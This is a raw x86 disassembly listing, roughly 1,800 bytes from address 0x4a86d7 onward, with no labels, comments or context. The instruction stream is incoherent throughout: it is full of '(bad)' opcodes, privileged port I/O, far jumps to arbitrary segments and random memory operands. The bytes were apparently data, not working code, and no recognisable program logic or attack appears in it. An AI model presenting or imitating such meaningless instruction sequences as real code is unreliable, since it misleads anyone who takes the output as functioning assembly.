  4a86d7:	xor    ebp,DWORD PTR [ebp-0x4b680f3b]
  4a86dd:	cmp    cl,0x58
  4a86e0:	and    al,0xa0
  4a86e2:	fisttp QWORD PTR [edx+esi*4+0x10]
  4a86e6:	pop    es
  4a86e7:	jbe    0x4a86f9
  4a86e9:	or     BYTE PTR [eax+eax*8],dl
  4a86ec:	lds    eax,FWORD PTR [edi-0x25749a41]
  4a86f2:	int3   
  4a86f3:	iretw  
  4a86f5:	sub    edi,DWORD PTR [eax+0xc]
  4a86f8:	je     0x4a870a
  4a86fa:	push   esi
  4a86fb:	push   edx
  4a86fc:	cmp    BYTE PTR [edx+0x71],ah
  4a86ff:	xchg   edx,eax
  4a8700:	jo     0x4a86e7
  4a8702:	mov    ch,0x9f
  4a8704:	inc    ebp
  4a8705:	js     0x4a8709
  4a8707:	and    cl,0xfe
  4a870a:	mov    ecx,DWORD PTR [edi]
  4a870c:	push   ecx
  4a870d:	xchg   edi,eax
  4a870e:	shr    BYTE PTR [edx-0x33],cl
  4a8711:	mov    ch,0x58
  4a8713:	or     eax,DWORD PTR [ecx]
  4a8715:	test   esp,edi
  4a8717:	xchg   esp,eax
  4a8718:	inc    edi
  4a8719:	mov    eax,ds:0x98871933
  4a871e:	arpl   bp,bp
  4a8720:	add    al,0x95
  4a8722:	fwait
  4a8723:	and    eax,0x236957ad
  4a8728:	jno    0x4a8771
  4a872a:	xchg   esp,eax
  4a872b:	ins    BYTE PTR es:[edi],dx
  4a872c:	mov    al,0x7b
  4a872e:	sub    BYTE PTR [eax],dl
  4a8730:	pop    ebp
  4a8731:	push   ecx
  4a8732:	push   eax
  4a8733:	je     0x4a8757
  4a8735:	ins    BYTE PTR es:[edi],dx
  4a8736:	ja     0x4a87b0
  4a8738:	fs call 0x7554:0x845110e6
  4a8740:	lea    eax,[ebp+0x715b1981]
  4a8746:	jmp    0x4a86e4
  4a8748:	in     eax,dx
  4a8749:	mov    al,ds:0xdf041833
  4a874e:	in     eax,0xfc
  4a8750:	mov    es,WORD PTR [ecx+0x70]
  4a8753:	or     BYTE PTR [edi+0x8341cfa],al
  4a8759:	aam    0x3b
  4a875b:	mov    WORD PTR [ebx],ds
  4a875d:	push   es
  4a875e:	leave  
  4a875f:	or     ah,BYTE PTR [edi+0x70]
  4a8762:	dec    eax
  4a8763:	test   al,0x1b
  4a8765:	test   esi,esi
  4a8767:	jp     0x4a87e1
  4a8769:	sub    BYTE PTR [ebx],al
  4a876b:	jmp    edx
  4a876d:	call   DWORD PTR [eax-0x5]
  4a8770:	sub    BYTE PTR cs:[esi-0x3aefa6fd],0x53
  4a8778:	xchg   ecx,eax
  4a8779:	mov    eax,0xc819621
  4a877e:	pop    esi
  4a877f:	aam    0x20
  4a8781:	shr    BYTE PTR [edx+0x5f],0xe7
  4a8785:	add    dl,al
  4a8787:	add    BYTE PTR [edx],bh
  4a8789:	dec    esi
  4a878a:	adc    bh,ch
  4a878c:	add    DWORD PTR [eax],ebx
  4a878e:	xchg   ebx,ebx
  4a8790:	xchg   ebp,eax
  4a8791:	clc    
  4a8792:	sbb    bl,BYTE PTR [esi]
  4a8794:	push   ds
  4a8795:	jns    0x4a8779
  4a8797:	mov    ds:0x7e396055,al
  4a879c:	fadd   st,st(3)
  4a879e:	ds mov esp,0xce3bea50
  4a87a4:	mov    al,0xf7
  4a87a6:	(bad)  [ebp-0x4fba3a62]
  4a87ac:	inc    ebp
  4a87ad:	ret    
  4a87ae:	sub    eax,0x83b803b
  4a87b3:	retf   0x118f
  4a87b6:	test   BYTE PTR [ecx],bl
  4a87b8:	xchg   ebp,eax
  4a87b9:	mov    ah,0xc6
  4a87bb:	add    BYTE PTR [eax-0xc],dh
  4a87be:	sbb    eax,0xc01edd1d
  4a87c3:	sub    eax,edi
  4a87c5:	(bad)  
  4a87c6:	mov    WORD PTR [esi],?
  4a87c8:	dec    ebp
  4a87c9:	push   ecx
  4a87ca:	int3   
  4a87cb:	inc    BYTE PTR [esi-0x1b]
  4a87ce:	xchg   ebx,eax
  4a87cf:	test   al,0x10
  4a87d1:	push   edx
  4a87d2:	sbb    BYTE PTR [ecx],ah
  4a87d4:	mov    dl,dh
  4a87d6:	push   DWORD PTR [esi]
  4a87d8:	or     BYTE PTR [edx+0x19],bh
  4a87db:	icebp  
  4a87dc:	push   edx
  4a87dd:	cmp    al,0x14
  4a87df:	je     0x4a883b
  4a87e1:	cmp    al,0x8
  4a87e3:	jne    0x4a8839
  4a87e5:	xor    BYTE PTR [ebp-0x2183116f],dl
  4a87eb:	add    BYTE PTR [edx-0x101f1f12],ch
  4a87f1:	mov    esp,0xf870289d
  4a87f6:	xor    esp,DWORD PTR [ecx]
  4a87f8:	push   ecx
  4a87f9:	jns    0x4a87bd
  4a87fb:	cld    
  4a87fc:	js     0x4a8811
  4a87fe:	or     al,0x2d
  4a8800:	lods   eax,DWORD PTR ds:[esi]
  4a8801:	cs add eax,0x5029c441
  4a8807:	and    BYTE PTR [ebx+0x75],dh
  4a880a:	ret    
  4a880b:	mov    al,0x8a
  4a880d:	cmp    al,0x18
  4a880f:	jne    0x4a8841
  4a8811:	clc    
  4a8812:	mov    al,ds:0xd2858212
  4a8817:	cmp    cl,ah
  4a8819:	xchg   esp,eax
  4a881a:	mov    ds:0x279a3ca0,eax
  4a881f:	push   esi
  4a8820:	js     0x4a8875
  4a8822:	jmp    FWORD PTR [edx]
  4a8824:	sbb    edx,DWORD PTR [esp+ebx*4]
  4a8827:	add    DWORD PTR [edi+edx*1+0x60],0x37
  4a882c:	aas    
  4a882d:	push   eax
  4a882e:	lea    eax,[ebx+0x4c9b270a]
  4a8834:	push   ecx
  4a8835:	push   ebx
  4a8836:	jbe    0x4a8826
  4a8838:	mov    ebx,0x60b96884
  4a883d:	sbb    BYTE PTR [edx+edx*2],cl
  4a8840:	push   ebx
  4a8841:	stos   DWORD PTR es:[edi],eax
  4a8842:	sub    DWORD PTR [eax],edi
  4a8844:	mov    eax,ds:0x22de9d23
  4a8849:	xor    al,0x38
  4a884b:	mov    cl,0x4
  4a884d:	les    ebp,FWORD PTR [esi]
  4a884f:	cmp    BYTE PTR [edx+0x56938cd0],cl
  4a8855:	xchg   ebp,eax
  4a8856:	clc    
  4a8857:	test   BYTE PTR [ecx+eax*1+0x61495f9],cl
  4a885e:	or     bh,bh
  4a8860:	dec    edi
  4a8861:	push   0xaa7d031a
  4a8866:	or     eax,0x8d3b75c
  4a886b:	xchg   DWORD PTR [ecx+0x3b27f407],esi
  4a8871:	fidiv  WORD PTR [ebp+0x57]
  4a8874:	cmp    DWORD PTR [edi+0x2b2d745d],0x17
  4a887b:	xor    BYTE PTR [ebx],0xcc
  4a887e:	shl    DWORD PTR [edx],cl
  4a8880:	add    eax,0xb862c1dc
  4a8885:	xchg   DWORD PTR [ecx],esi
  4a8887:	fidivr WORD PTR [esi-0x297e5ea8]
  4a888d:	mov    bl,0x84
  4a888f:	leave  
  4a8890:	pop    ss
  4a8891:	jb     0x4a88c4
  4a8893:	sbb    cl,BYTE PTR [ebx]
  4a8895:	jnp    0x4a88ea
  4a8897:	in     eax,dx
  4a8898:	or     BYTE PTR [edi+0xb04e16f],al
  4a889e:	js     0x4a8836
  4a88a0:	into   
  4a88a1:	int3   
  4a88a2:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a88a4:	call   DWORD PTR [esi-0x3a]
  4a88a7:	daa    
  4a88a8:	or     cl,BYTE PTR [edx+0x740e4b81]
  4a88ae:	mov    bh,0x3c
  4a88b0:	pcmpeqb mm6,QWORD PTR [ebx+0x850823c]
  4a88b7:	loope  0x4a88cc
  4a88b9:	je     0x4a886a
  4a88bb:	push   eax
  4a88bc:	stos   DWORD PTR es:[edi],eax
  4a88bd:	jl     0x4a8879
  4a88bf:	sbb    BYTE PTR [esi-0x57],0xa5
  4a88c3:	(bad)  
  4a88c4:	mulps  xmm7,xmm0
  4a88c7:	ret    0x29e6
  4a88ca:	cmp    edi,eax
  4a88cc:	ja     0x4a8900
  4a88ce:	or     al,0x4
  4a88d0:	xchg   ecx,eax
  4a88d1:	pusha  
  4a88d2:	and    DWORD PTR ds:0x5228f79e,eax
  4a88d8:	cmp    BYTE PTR [edx],cl
  4a88da:	pop    esi
  4a88db:	or     DWORD PTR [ebx-0x718acdc],edx
  4a88e1:	or     al,dl
  4a88e3:	xor    ecx,DWORD PTR [ebx]
  4a88e5:	pop    ebp
  4a88e6:	mov    eax,0x9f00198b
  4a88eb:	mov    al,ds:0xc556131a
  4a88f0:	pop    ebx
  4a88f1:	push   ss
  4a88f2:	ss inc edi
  4a88f4:	sub    eax,0x8032e7d9
  4a88f9:	idiv   DWORD PTR [ebp-0x5defdbe4]
  4a88ff:	sbb    ch,BYTE PTR [edi]
  4a8901:	pop    es
  4a8902:	add    al,0x9c
  4a8904:	mov    DWORD PTR ds:0x86373b26,ecx
  4a890a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a890b:	push   0xb2b62006
  4a8910:	adc    bh,bh
  4a8912:	std    
  4a8913:	mov    esp,0x8f0f28f3
  4a8918:	xchg   DWORD PTR [esi],ebp
  4a891a:	adc    al,0x24
  4a891c:	jl     0x4a899b
  4a891e:	or     ch,BYTE PTR [edi+edi*2]
  4a8921:	ja     0x4a88a3
  4a8923:	mov    ebx,0xbcf0036c
  4a8928:	seta   BYTE PTR [eax+ebx*4+0x1c]
  4a892d:	sbb    BYTE PTR [esi+eax*4+0x58e5405d],dh
  4a8934:	and    eax,0x503c8640
  4a8939:	sub    esi,DWORD PTR [edi+0x25]
  4a893c:	jmp    0x8276aed1
  4a8941:	mov    bh,0x40
  4a8943:	jl     0x4a897b
  4a8945:	push   ss
  4a8946:	mov    BYTE PTR [ebx+0xf172966],bh
  4a894c:	mov    edi,0x2333f771
  4a8951:	lods   eax,DWORD PTR ds:[esi]
  4a8952:	sbb    eax,0x2209b724
  4a8957:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a8958:	shl    BYTE PTR [eax-0x7b],0xfa
  4a895c:	mov    edx,0xb468acce
  4a8961:	jle    0x4a89a6
  4a8963:	cmp    DWORD PTR [ebx-0x1a],0xffffffd8
  4a8967:	sbb    ecx,ecx
  4a8969:	(bad)  
  4a896a:	or     eax,0x522b1d78
  4a896f:	push   0x20
  4a8971:	nop
  4a8972:	cmp    ah,BYTE PTR [eax]
  4a8974:	dec    esp
  4a8975:	push   ebx
  4a8976:	pop    ebp
  4a8977:	jbe    0x4a89b3
  4a8979:	aam    0x24
  4a897b:	push   cs
  4a897c:	pop    ds
  4a897d:	sbb    dh,BYTE PTR [ebp+0x42]
  4a8980:	lock rcr BYTE PTR [edx-0x3f],cl
  4a8984:	inc    esi
  4a8985:	adc    al,0x47
  4a8987:	inc    ebx
  4a8988:	dec    edi
  4a8989:	lea    ebp,[ebx+eiz*4+0x29025f16]
  4a8990:	pop    es
  4a8991:	or     ecx,DWORD PTR ds:0xf6bbd50a
  4a8997:	cmp    BYTE PTR [esi+0x5c],bl
  4a899a:	or     esp,eax
  4a899c:	ss pop edx
  4a899e:	mov    edx,0x40168f2
  4a89a3:	pop    ebx
  4a89a4:	fisttp DWORD PTR [eax+0x70]
  4a89a7:	ss add dh,bl
  4a89aa:	or     eax,0x79
  4a89ad:	mov    ah,0x2c
  4a89af:	clc    
  4a89b0:	sar    BYTE PTR [ecx+0x4],0x56
  4a89b4:	sub    edx,DWORD PTR es:[edi+0xe]
  4a89b8:	mov    BYTE PTR [edx],dl
  4a89ba:	and    DWORD PTR [ebp+0x33],ebx
  4a89bd:	or     al,BYTE PTR [esi]
  4a89bf:	cld    
  4a89c0:	in     al,0x16
  4a89c2:	(bad)  
  4a89c3:	fild   WORD PTR ds:0x161458cd
  4a89c9:	pop    esp
  4a89ca:	sbb    ecx,DWORD PTR [edi+eax*1-0x4a5e675f]
  4a89d1:	jmp    0x96bdda7f
  4a89d6:	test   BYTE PTR [edi],bl
  4a89d8:	pop    ebx
  4a89d9:	inc    edi
  4a89da:	jg     0x4a898d
  4a89dc:	cmp    eax,0xd4035c0f
  4a89e1:	adc    al,0x15
  4a89e3:	stc    
  4a89e4:	sbb    ah,BYTE PTR [eax]
  4a89e6:	sbb    al,0x94
  4a89e8:	mov    al,0x28
  4a89ea:	mov    bl,0xcc
  4a89ec:	cmp    eax,0x458c74a4
  4a89f1:	mov    esp,0xa4d6fc0e
  4a89f6:	xchg   esi,eax
  4a89f7:	xor    BYTE PTR [ecx+0x1e3591c],cl
  4a89fd:	add    DWORD PTR [ebp-0x72ef02f4],edx
  4a8a03:	push   es
  4a8a04:	sbb    al,0x66
  4a8a06:	xchg   edx,eax
  4a8a07:	and    BYTE PTR [edx],0xff
  4a8a0a:	or     edx,DWORD PTR [edx+0x8]
  4a8a0d:	enter  0x1374,0xe5
  4a8a11:	daa    
  4a8a12:	ds push ecx
  4a8a14:	lea    ebx,[ebx+eiz*4]
  4a8a17:	bound  esp,QWORD PTR [ebx+0x48092360]
  4a8a1d:	mov    cl,ah
  4a8a1f:	outs   dx,BYTE PTR ds:[esi]
  4a8a20:	push   esi
  4a8a21:	and    al,0x1
  4a8a23:	out    0x4,al
  4a8a25:	mov    dh,0xbd
  4a8a27:	arpl   cx,dx
  4a8a29:	inc    esp
  4a8a2a:	les    esp,FWORD PTR [edi]
  4a8a2c:	mov    edx,0x911bb01
  4a8a31:	push   ds
  4a8a32:	mov    bh,0xb
  4a8a34:	ret    0x164f
  4a8a37:	jns    0x4a8aa8
  4a8a39:	add    DWORD PTR [ebx+0x0],ebp
  4a8a3c:	push   0x2345882d
  4a8a41:	inc    ebx
  4a8a42:	add    ecx,DWORD PTR [esi+edx*1]
  4a8a45:	sysret 
  4a8a47:	add    ebp,DWORD PTR [eax+esi*4+0x12981b89]
  4a8a4e:	dec    ebx
  4a8a50:	shl    BYTE PTR [ecx+eiz*1],cl
  4a8a53:	(bad)  
  4a8a54:	pop    eax
  4a8a55:	inc    esp
  4a8a56:	mov    eax,DWORD PTR [eax+0x48]
  4a8a59:	adc    BYTE PTR ds:0x7f209d5,0xa2
  4a8a60:	lods   al,BYTE PTR ds:[esi]
  4a8a61:	mov    ds:0xc3baf13e,eax
  4a8a66:	or     eax,0x4c311e04
  4a8a6b:	push   ebx
  4a8a6c:	cmp    bl,ah
  4a8a6e:	mov    al,ds:0x506e806e
  4a8a73:	jae    0x4a8ad6
  4a8a75:	popa   
  4a8a76:	jne    0x4a8a2e
  4a8a78:	or     al,0x90
  4a8a7a:	test   BYTE PTR [ebp+0x56bf777e],ch
  4a8a80:	pop    eax
  4a8a81:	adc    al,0x8a
  4a8a83:	call   DWORD PTR [esi+0x57]
  4a8a86:	arpl   WORD PTR [ebx+0x56],cx
  4a8a89:	push   0x110865fd
  4a8a8e:	or     DWORD PTR [bx-0x6e],esp
  4a8a92:	clc    
  4a8a93:	cmp    ch,BYTE PTR [esi+0x50652707]
  4a8a99:	imul   esp,DWORD PTR [eax],0x36d85d40
  4a8a9f:	or     eax,0x91d248fe
  4a8aa4:	mov    eax,ds:0xf8ca6f0b
  4a8aa9:	js     0x4a8adf
  4a8aab:	mov    ch,0xc3
  4a8aad:	add    DWORD PTR [edi+0x1a0205a6],ecx
  4a8ab3:	(bad)  
  4a8ab4:	or     cl,BYTE PTR [edx+edx*1]
  4a8ab7:	push   esi
  4a8ab8:	mov    ebp,DWORD PTR [edx+0x30]
  4a8abb:	dec    ecx
  4a8abc:	jbe    0x4a8ace
  4a8abe:	jmp    FWORD PTR [ebx+eax*2-0x68a78a4d]
  4a8ac5:	xor    cl,BYTE PTR [edx]
  4a8ac7:	xchg   ebx,eax
  4a8ac8:	add    al,0x5c
  4a8aca:	aaa    
  4a8acb:	push   edi
  4a8acc:	adc    al,0x2f
  4a8ace:	test   al,0xf
  4a8ad0:	lds    edx,FWORD PTR [eax]
  4a8ad2:	adc    edx,edi
  4a8ad4:	ins    DWORD PTR es:[edi],dx
  4a8ad5:	push   ds
  4a8ad6:	mov    DWORD PTR [esi],eax
  4a8ad8:	sub    ah,BYTE PTR [edx+0x1b]
  4a8adb:	pop    ss
  4a8adc:	jg     0x4a8af3
  4a8ade:	ins    DWORD PTR es:[edi],dx
  4a8adf:	dec    ecx
  4a8ae0:	ror    BYTE PTR [edx-0x62],0x4
  4a8ae4:	ins    DWORD PTR es:[edi],dx
  4a8ae5:	dec    ecx
  4a8ae6:	mov    al,0x92
  4a8ae8:	adc    esi,DWORD PTR [ecx]
  4a8aea:	pop    ecx
  4a8aeb:	ins    DWORD PTR es:[edi],dx
  4a8aec:	mov    al,ds:0x124507c9
  4a8af1:	fld    QWORD PTR [ebp*2-0x37ff8ea1]
  4a8af8:	pop    es
  4a8af9:	add    al,0x6d
  4a8afb:	pop    edi
  4a8afc:	push   ebp
  4a8afd:	loop   0x4a8b19
  4a8aff:	ret    0x8903
  4a8b02:	leave  
  4a8b03:	call   0xa0df991a
  4a8b08:	jae    0x4a8b14
  4a8b0a:	icebp  
  4a8b0b:	out    dx,al
  4a8b0c:	pop    es
  4a8b0d:	cmc    
  4a8b0e:	push   es
  4a8b0f:	cmp    bl,BYTE PTR [eax]
  4a8b11:	mov    eax,ds:0x3e03b020
  4a8b16:	sbb    BYTE PTR [eax-0x7f],bl
  4a8b19:	pop    ecx
  4a8b1a:	mov    esi,0x1291b0f4
  4a8b1f:	les    ebx,FWORD PTR [ebx]
  4a8b21:	cli    
  4a8b22:	stc    
  4a8b23:	inc    edi
  4a8b24:	(bad)  
  4a8b25:	cmp    eax,0x59a03657
  4a8b2a:	add    DWORD PTR es:[esi],ebp
  4a8b2d:	add    BYTE PTR [esi+ecx*1-0x10],0x65
  4a8b32:	pusha  
  4a8b33:	xlat   BYTE PTR ds:[ebx]
  4a8b34:	or     al,0xdb
  4a8b36:	xlat   BYTE PTR ds:[ebx]
  4a8b37:	pop    es
  4a8b38:	dec    eax
  4a8b39:	sbb    al,0x12
  4a8b3b:	fild   QWORD PTR [edi]
  4a8b3d:	popa   
  4a8b3e:	sbb    eax,0xe6b76c00
  4a8b43:	sub    ebp,0xa9060c29
  4a8b49:	stc    
  4a8b4a:	jbe    0x4a8b83
  4a8b4c:	mov    DWORD PTR [eax],edx
  4a8b4e:	adc    al,0xd6
  4a8b50:	push   esi
  4a8b51:	js     0x4a8b15
  4a8b53:	jg     0x4a8b76
  4a8b55:	sbb    ah,BYTE PTR [esi+0x53d1c956]
  4a8b5b:	push   0x3
  4a8b5d:	push   ecx
  4a8b5e:	enter  0x49ba,0xe2
  4a8b62:	mov    ebx,edi
  4a8b64:	push   edx
  4a8b65:	dec    esp
  4a8b66:	push   ebx
  4a8b67:	pop    ebp
  4a8b68:	sub    al,0x6d
  4a8b6a:	out    dx,al
  4a8b6b:	adc    esp,DWORD PTR [ebx-0x252bde81]
  4a8b71:	leave  
  4a8b72:	jbe    0x4a8ba1
  4a8b74:	mov    al,ds:0xa35b5052
  4a8b79:	sbb    esi,DWORD PTR [esi]
  4a8b7b:	call   0x1c7d:0xf802091a
  4a8b82:	cld    
  4a8b83:	xchg   ah,cl
  4a8b85:	push   ss
  4a8b86:	dec    eax
  4a8b87:	sbb    BYTE PTR [ebx+0x5a813202],dl
  4a8b8d:	or     DWORD PTR ds:0x1003670c,eax
  4a8b93:	dec    ebx
  4a8b94:	call   0x4a61:0x181ce76e
  4a8b9b:	mov    dh,0x7
  4a8b9d:	xor    eax,0x5e5251ac
  4a8ba2:	repz mov ah,0xf
  4a8ba5:	xchg   DWORD PTR [ebx+0x124a04ff],ebp
  4a8bab:	jg     0x4a8bb3
  4a8bad:	or     BYTE PTR cs:[ecx],0x67
  4a8bb1:	ds iret 
  4a8bb3:	lods   eax,DWORD PTR ds:[esi]
  4a8bb4:	(bad)  
  4a8bb5:	in     al,dx
  4a8bb6:	jle    0x4a8bee
  4a8bb8:	idiv   ch
  4a8bba:	mov    bh,0xb
  4a8bbc:	std    
  4a8bbd:	push   es
  4a8bbe:	add    DWORD PTR [edi],eax
  4a8bc0:	add    eax,DWORD PTR [edi]
  4a8bc2:	add    al,0x7
  4a8bc4:	add    eax,0x6030107
  4a8bc9:	push   es
  4a8bca:	inc    edx
  4a8bcb:	and    DWORD PTR [edi+0x0],0x9e15195f
  4a8bd2:	dec    ebp
  4a8bd3:	lods   eax,DWORD PTR ds:[esi]
  4a8bd4:	pop    eax
  4a8bd5:	aad    0x11
  4a8bd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a8bd8:	sbb    esi,DWORD PTR [eax]
  4a8bda:	sub    eax,0xd8e68418
  4a8bdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a8be0:	push   eax
  4a8be1:	fimul  WORD PTR [edx]
  4a8be3:	add    al,0xa
  4a8be5:	test   al,0xf8
  4a8be7:	inc    ebx
  4a8be8:	cs xchg esp,eax
  4a8bea:	adc    al,dh
  4a8bec:	jne    0x4a8c54
  4a8bee:	icebp  
  4a8bef:	nop
  4a8bf0:	push   es
  4a8bf1:	dec    esi
  4a8bf2:	les    eax,FWORD PTR [edi+ecx*2]
  4a8bf5:	pop    ebp
  4a8bf6:	or     al,0x4d
  4a8bf8:	clc    
  4a8bf9:	or     DWORD PTR [edi-0x743ef670],ebx
  4a8bff:	cmp    al,ah
  4a8c01:	arpl   WORD PTR [ebx+edi*8-0x4],bp
  4a8c05:	aaa    
  4a8c06:	pop    edi
  4a8c07:	cmp    al,0x2
  4a8c09:	je     0x4a8c66
  4a8c0b:	cmp    al,0x3
  4a8c0d:	je     0x4a8c66
  4a8c0f:	jne    0x4a8c62
  4a8c11:	mov    ebx,0x13108ba2
  4a8c16:	enter  0x85b5,0xd0
  4a8c1a:	popf   
  4a8c1b:	add    al,0x74
  4a8c1d:	sbb    BYTE PTR [eax+0x11c92851],dh
  4a8c23:	ret    0x7a66
  4a8c26:	pop    edi
  4a8c27:	(bad)  
  4a8c28:	pop    ecx
  4a8c29:	or     al,0xb0
  4a8c2b:	or     al,0x69
  4a8c2d:	das    
  4a8c2e:	imul   esp,DWORD PTR [eax-0x20],0xcdc26230
  4a8c35:	lfs    esi,FWORD PTR [edx+eax*1]
  4a8c39:	inc    edi
  4a8c3a:	cmp    esp,DWORD PTR [ecx]
  4a8c3c:	and    eax,0x44f262c
  4a8c41:	cmp    al,0x4
  4a8c43:	or     BYTE PTR [ecx],cl
  4a8c45:	cmp    edx,ebp
  4a8c47:	adc    esp,edi
  4a8c49:	cmp    dl,BYTE PTR [edi+eiz*1]
  4a8c4c:	sub    al,0x16
  4a8c4e:	pop    esp
  4a8c4f:	mov    cl,0x77
  4a8c51:	and    BYTE PTR [edx],al
  4a8c53:	dec    edx
  4a8c54:	add    ebp,ebp
  4a8c56:	inc    ebp
  4a8c57:	dec    ebx
  4a8c58:	pop    ebp
  4a8c59:	cld    
  4a8c5a:	sbb    bl,BYTE PTR [ecx+0x774a1ba3]
  4a8c60:	push   edx
  4a8c61:	in     al,dx
  4a8c62:	xor    BYTE PTR [esi],ah
  4a8c64:	push   ss
  4a8c65:	pop    es
  4a8c66:	xor    al,0x77
  4a8c68:	loope  0x4a8cda
  4a8c6a:	xor    BYTE PTR [ebp+0x4afc9199],al
  4a8c70:	push   eax
  4a8c71:	dec    ebx
  4a8c72:	push   eax
  4a8c73:	mov    al,ds:0xb2801cb
  4a8c78:	cmp    al,0x56
  4a8c7a:	mov    BYTE PTR [edi],ah
  4a8c7c:	lock cmp BYTE PTR [ebx],0x89
  4a8c80:	(bad)  
  4a8c81:	xlat   BYTE PTR ds:[ebx]
  4a8c82:	pop    edi
  4a8c83:	or     DWORD PTR [eax+eax*1+0xd9e85bd],0x1e9a0c3c
  4a8c8e:	push   esi
  4a8c8f:	push   eax
  4a8c90:	(bad)  
  4a8c91:	and    ah,BYTE PTR [eax+0x61822e34]
  4a8c97:	push   0x28
  4a8c99:	and    eax,0x55a07505
  4a8c9e:	enter  0x7b6f,0x3c
  4a8ca2:	in     eax,0x4b
  4a8ca4:	lahf   
  4a8ca5:	add    al,0x8d
  4a8ca7:	out    0x92,al
  4a8ca9:	sbb    ah,BYTE PTR [ebx-0x27f3583]
  4a8caf:	(bad)  
  4a8cb0:	pop    eax
  4a8cb1:	pop    es
  4a8cb2:	aad    0xe4
  4a8cb4:	test   DWORD PTR [ebx],0x1f447581
  4a8cba:	mov    ecx,DWORD PTR [ecx-0x1effd66c]
  4a8cc0:	retf   0x14c2
  4a8cc3:	mov    cl,0x6e
  4a8cc5:	push   es
  4a8cc6:	cmc    
  4a8cc7:	jle    0x4a8d35
  4a8cc9:	dec    ebp
  4a8cca:	in     al,0x68
  4a8ccc:	inc    esp
  4a8ccd:	pop    esi
  4a8cce:	lea    edx,[edx]
  4a8cd0:	xchg   ebp,eax
  4a8cd1:	enter  0xc8df,0x8c
  4a8cd5:	and    al,0x6c
  4a8cd7:	inc    ebp
  4a8cd8:	int3   
  4a8cd9:	dec    edi
  4a8cda:	lock and DWORD PTR fs:[ebp+eiz*2+0x22973100],ebx
  4a8ce3:	out    dx,eax
  4a8ce4:	in     eax,dx
  4a8ce5:	push   ebx
  4a8ce6:	mul    BYTE PTR [edx]
  4a8ce8:	(bad)  
  4a8ce9:	push   eax
  4a8cea:	out    0x4d,al
  4a8cec:	retf   0x961b
  4a8cef:	retf   0xf8c4
  4a8cf2:	pop    ds
  4a8cf3:	adc    DWORD PTR [ecx-0x7b],0xffffffc2
  4a8cf7:	inc    esp
  4a8cf8:	xchg   DWORD PTR [edi],esi
  4a8cfa:	push   edx
  4a8cfb:	pop    ebp
  4a8cfc:	jg     0x4a8c9a
  4a8cfe:	(bad)  
  4a8cff:	add    ah,BYTE PTR [ecx-0x5dc7ea70]
  4a8d05:	jg     0x4a8d7d
  4a8d07:	mov    ebx,0xb492b3a3
  4a8d0c:	enter  0xb8df,0xfc
  4a8d10:	popf   
  4a8d11:	push   ecx
  4a8d12:	push   0xb22251a7
  4a8d17:	je     0x4a8cb4
  4a8d19:	inc    eax
  4a8d1a:	push   0xdb791c25
  4a8d1f:	je     0x4a8d6b
  4a8d21:	test   eax,edx
  4a8d23:	push   edi
  4a8d24:	add    eax,0x57
  4a8d27:	add    bl,BYTE PTR [esi]
  4a8d29:	cmc    
  4a8d2a:	ds cmp eax,0x96667e4a
  4a8d30:	pop    eax
  4a8d31:	lock or al,0x65
  4a8d34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a8d35:	neg    BYTE PTR ds:0x85c174fd
  4a8d3b:	(bad)  [edx]
  4a8d3d:	sar    DWORD PTR [edi-0x4e],0xc0
  4a8d41:	leave  
  4a8d42:	pop    ebx
  4a8d43:	and    BYTE PTR [ebx+0x2d1e845d],bl
  4a8d49:	dec    DWORD PTR [eax-0x4a]
  4a8d4c:	jb     0x4a8dbe
  4a8d4e:	xlat   BYTE PTR ds:[ebx]
  4a8d4f:	push   esp
  4a8d50:	add    cl,BYTE PTR [eax-0x7b28f7e4]
  4a8d56:	dec    edi
  4a8d57:	js     0x4a8cd9
  4a8d59:	cmp    BYTE PTR ss:[edx+0x69401657],0x1a
  4a8d61:	add    ecx,eax
  4a8d63:	shl    ah,1
  4a8d65:	sub    eax,DWORD PTR [esi]
  4a8d67:	cmc    
  4a8d68:	ins    BYTE PTR es:[edi],dx
  4a8d69:	jge    0x4a8dde
  4a8d6b:	adc    bh,al
  4a8d6d:	sub    ecx,DWORD PTR [eax]
  4a8d6f:	scas   eax,DWORD PTR es:[edi]
  4a8d70:	fs pop edi
  4a8d72:	push   edx
  4a8d73:	add    eax,0xb75ec0b
  4a8d78:	mov    ch,0xfa
  4a8d7a:	xchg   ecx,eax
  4a8d7b:	std    
  4a8d7c:	lods   eax,DWORD PTR ds:[esi]
  4a8d7d:	inc    ebp
  4a8d7e:	mov    dh,0x5a
  4a8d80:	xchg   ebx,eax
  4a8d81:	mov    al,0xea
  4a8d83:	fisttp QWORD PTR [ebx+0x2050ae83]
  4a8d89:	pop    eax
  4a8d8a:	dec    edi
  4a8d8b:	xor    BYTE PTR ds:0xdf42c230,al
  4a8d91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a8d92:	cdq    
  4a8d93:	mov    dh,0x30
  4a8d95:	mov    esp,0x27240d7c
  4a8d9a:	add    BYTE PTR [ebp+0x55c81352],dh
  4a8da0:	jmp    0xa728:0x835b7c30
  4a8da7:	lods   al,BYTE PTR ds:[esi]
  4a8da8:	int3   
  4a8da9:	aaa    
  4a8daa:	sbb    DWORD PTR [ebx+0x38a4b4f0],edi
  4a8db0:	sub    ch,BYTE PTR [eax+0x4afb4bf9]
  4a8db6:	adc    ebx,edx
  4a8db8:	lea    edi,[ebp-0x58]
  4a8dbb:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a8dbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a8dbe:	mov    ah,0xd1
  4a8dc0:	outs   dx,DWORD PTR ds:[esi]
  4a8dc1:	sbb    BYTE PTR [esi-0x10],cl
  4a8dc4:	jb     0x4a8df7
  4a8dc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a8dc7:	dec    edi
  4a8dc8:	mov    bh,0xd0
  4a8dca:	pop    ebx
  4a8dcb:	jae    0x4a8e12
  4a8dcd:	add    al,0xfc
  4a8dcf:	add    BYTE PTR [edx+0x10f38888],cl
  4a8dd5:	jne    0x4a8ddb
  4a8dd7:	jne    0x4a8dfb
  4a8dd9:	xchg   DWORD PTR [esi+ecx*2+0x68],eax
  4a8ddd:	dec    eax
  4a8dde:	pop    ss
  4a8ddf:	or     DWORD PTR [ebp-0x7f],ebp
